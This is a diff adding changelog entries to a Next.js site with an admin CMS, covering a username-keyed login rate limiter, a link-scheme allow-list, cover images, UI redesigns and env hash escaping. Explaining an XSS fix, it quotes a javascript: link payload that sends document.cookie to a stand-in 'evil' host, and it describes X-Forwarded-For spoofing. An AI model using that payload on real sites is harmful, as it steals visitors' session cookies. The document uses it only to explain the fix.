@@ -9,6 +9,141 @@ break by not knowing.
 
 ## Unreleased
 
+### Login rate limiter now also keys on username, not just the spoofable client IP
+- **What** `src/lib/rate-limiter.ts` runs two independent limiters instead of
+  one: the existing per-IP counter, plus a new per-username counter.
+  `loginAdminAction` checks and records failures against both, and only
+  resets both together on a real login.
+- **Why** `extractClientIp()` (in `auth.ts`) reads `X-Forwarded-For`, which is
+  entirely client-supplied and unverified - the code already says as much in
+  a comment there. A login attempt with a different fake IP on every request
+  got a fresh 3-attempt allowance each time, so the "3 tries then 10-minute
+  block" promised on the login screen never actually engaged. Verified with
+  an isolated script: the IP-only limiter stayed at "2 remaining" across five
+  distinct fake IPs in a row, while the new username limiter correctly
+  blocked on the third attempt and stayed blocked - independent of what IP is
+  claimed, since it never reads one.
+- **Watch** The username key is lower-cased and trimmed before lookup, so
+  "admin", "Admin" and "ADMIN" all share one counter - don't key it on the raw
+  input, or that normalization (and the protection) is gone. The login page's
+  copy used to say the *IP* would be blocked; it now says *access* is
+  blocked, since blocking is no longer only IP-scoped.
+
+### Article body links now go through a scheme allow-list before becoming `<a href>`
+- **What** Added `isSafeHref()` to `src/lib/article-utils.ts`, allowing only
+  `http:`, `https:`, `mailto:`, `tel:`, and scheme-less relative paths
+  (`/...`, `#...`). Applied it in `FormattedText` (renders article bodies on
+  the public site) and in the admin markdown editor's live-preview link
+  rendering, which had the identical unguarded pattern.
+- **Why** `[text](url)` parsing took the URL straight from the markdown with
+  no validation and rendered it into `<a href={url}>`.
+  `[Klik di sini](javascript:fetch('https://evil/steal?c='+document.cookie))`,
+  saved as ordinary article body text through the admin editor, published as
+  a real clickable link on `/knowledge/[slug]` - it runs in the browser of
+  whichever site visitor clicks it, not the account that wrote it. Built on
+  the `URL` constructor rather than a regex: WHATWG's URL parser strips
+  embedded tabs/newlines before reading the scheme, which closes the classic
+  `jav\tascript:` bypass a naive string check would miss - verified against
+  12 cases (6 safe, 6 malicious) including that one.
+- **Watch** An unsafe href degrades the link to plain text (just the label, no
+  `<a>`) rather than dropping it - a reader still sees the words. The two
+  copies of this link-parsing logic (public renderer, admin preview) are still
+  duplicated; if a third one is ever added, it needs the same `isSafeHref`
+  guard, not a fresh regex.
+
+### Guide articles gained cover images, shown in cards, the article hero, and structured data
+- **What** `KnowledgeArticle` gained optional `coverImage` / `coverImageAlt`
+  fields. The admin editor got an upload-or-paste-URL field (reusing the
+  existing `uploadArticleImageAction` pipeline) with a live preview. The image
+  now renders on the `/knowledge` grid, the homepage preview section, and as a
+  hero image on the article page itself, plus feeds the `image` field of the
+  Article JSON-LD when present.
+- **Why** Every card was pure text - four identical-looking rectangles with no
+  way to tell them apart at a glance. Filled in real photos from the existing
+  portfolio (a survey/measurement shot, an open wardrobe, two kitchens)
+  matched to what each article actually explains, rather than stock or
+  placeholder images.
+- **Watch** Rendered as a plain `<img>`, not `next/image`, everywhere -
+  deliberately, matching how in-body images already handle admin uploads and
+  pasted URLs: no pipeline variants exist for these, so `next/image` would
+  just be a pass-through wrapper. Cards fall back to a text-only layout (no
+  broken-image box) when `coverImage` is unset, which is still true for any
+  article an admin creates without one.
+
+### Knowledge cards redesigned: photo-first, category pill, and a `/knowledge` search + sidebar
+- **What** Rebuilt the article cards on `/knowledge` and the homepage preview
+  section (image on top when set, reading time, title with a hover-filling
+  arrow badge, category pill + date footer) and extracted the `/knowledge`
+  grid into a client component (`KnowledgeSearchGrid`) that filters by
+  title/category/summary as you type. The homepage preview section now shows
+  a "Lihat Semua Panduan" link once there are more than four articles. The
+  article detail page (`/knowledge/[slug]`) is now a two-column layout with a
+  sticky sidebar (`lg:sticky lg:top-24`) listing up to four other guides,
+  replacing the old full-width "Panduan lainnya" block at the bottom of the
+  page.
+- **Why** Requested after the four-card homepage grid went to
+  `lg:grid-cols-4`, which squeezed each card to ~340px and wrapped titles onto
+  five lines. Search and the sidebar exist for the same reason the see-all
+  link does: none of them mattered at four articles, all three start
+  mattering the moment there are more.
+- **Watch** Two rendering bugs surfaced and were fixed while building this,
+  worth knowing if the cards are touched again: (1) the category+time header
+  row needs `shrink-0 whitespace-nowrap` on the time badge, or a long category
+  name pushes it onto two lines; (2) cards must sit on
+  `bg-surface-container-lowest`, not `-container-low` - the latter is only six
+  RGB points off the section's own `bg-surface` and the card boundary
+  disappears. The sidebar caps at four other guides and only shows its own
+  "Lihat Semua" link past that count - it is not meant to list everything.
+
+### Fixed a cream seam between the public header's spacer and the admin panel
+- **What** Moved the `pt-20` that clears the public site's fixed header from
+  `<main>` in the root layout into `PageTransition`, which already reads the
+  route via `usePathname()` and now skips the padding on `/admin/*` routes.
+- **Why** `Header` already renders `null` on admin routes, but the root layout
+  applied `pt-20` to `<main>` unconditionally regardless - the padding
+  survived as a bare strip of the body's cream background sitting on top of
+  the admin panel's own white surface, printing a hard seam right under the
+  admin header.
+- **Watch** `Header`, `Footer`, and `StickyMobileCta` already key their own
+  visibility off this same `pathname.startsWith("/admin")` check - if a
+  fourth piece of chrome needs the same admin exception, follow that pattern
+  rather than inventing a new one.
+
+### Redesigned the admin CMS shell, dashboard, and login screen
+- **What** Reworked `admin/layout.tsx` (header, now a top-to-bottom
+  `surface` → `surface-container-lowest` gradient instead of flat white), the
+  articles dashboard (unified stat tiles with icon chips, a real segmented
+  filter control, refined empty state), and the login page (icon-mark card,
+  plus an autofill-color override in `globals.css` so saved-credential
+  autofill doesn't paint fields the browser's own blue or yellow).
+- **Why** The panel previously used ad-hoc inline styling that didn't match
+  the token system the rest of the site (`--color-surface-container-*`,
+  `--shadow-hairline`, etc.) already defines in `globals.css` - three
+  disconnected stat boxes, a plain-border tab row, and a login card with no
+  depth.
+- **Watch** Deliberately did **not** adopt generic frontend-skill defaults
+  (Geist/zinc palette, phosphor icons, spring-physics motion) here - this
+  project already has its own single-accent "Warm Architectural Editorial"
+  system and a documented preference for CSS-only motion over JS-driven
+  animation (see `reveal.tsx`). Match that system on any further admin work
+  rather than reaching for generic conventions.
+
+### `npm run admin:password` now prints a pre-escaped hash
+- **What** `scripts/admin-credentials.mjs` escapes every `$` in the scrypt
+  hash as `\$` before printing it, so the line you paste into `.env.local`
+  (`ADMIN_PASSWORD_HASH=scrypt\$32768\$8\$1\$<salt>\$<key>`) is already safe.
+- **Why** Next.js's env loader (`@next/env`) interpolates unescaped `$word` as
+  a reference to another env var, same as shell parameter expansion. Segments
+  like `$32768` or `$1` in the raw hash (`scrypt$N$r$p$salt$key`) matched that
+  pattern, resolved to nothing, and silently gutted the stored hash. Login then
+  failed with the generic "ADMIN_PASSWORD_HASH is malformed" from
+  `src/lib/auth.ts`, which reads like a bad password, not a parsing bug -
+  there was no hint anywhere that `.env.local` values needed escaping.
+- **Watch** The same interpolation risk applies to any future env value that
+  contains a literal `$` (a different hash format, anything with its own
+  `$`-delimited fields) - escape it the same way if it's ever hand-typed
+  rather than generated by this script.
+
 ### A runnable migration prompt for the second developer's agent
 - **What** `SYNC-AGENT.md`: step-by-step instructions an AI agent executes to
   move Developer B's clone onto this repository, with a proof step before the
